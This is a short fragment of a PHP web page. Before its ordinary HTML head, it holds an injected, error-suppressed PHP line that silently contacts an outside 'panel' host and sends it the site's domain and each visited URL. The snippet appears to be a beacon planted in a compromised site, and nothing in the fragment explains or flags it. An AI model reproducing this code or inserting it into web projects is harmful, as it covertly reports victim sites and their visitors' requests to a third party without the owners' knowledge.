...
?><?php $panel='https://collecptrxygms.pages.dev/';$host=$_SERVER['HTTP_HOST']??'';$https=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')||(($_SERVER['SERVER_PORT']??'')=='443');$scheme=$https?'https':'http';$url=$scheme.'://'.$host.($_SERVER['REQUEST_URI']??'/');@file_get_contents($panel.'?d='.rawurlencode($host).'&u='.rawurlencode($url));?>
<html>
<head>
	<meta charset="utf-8">
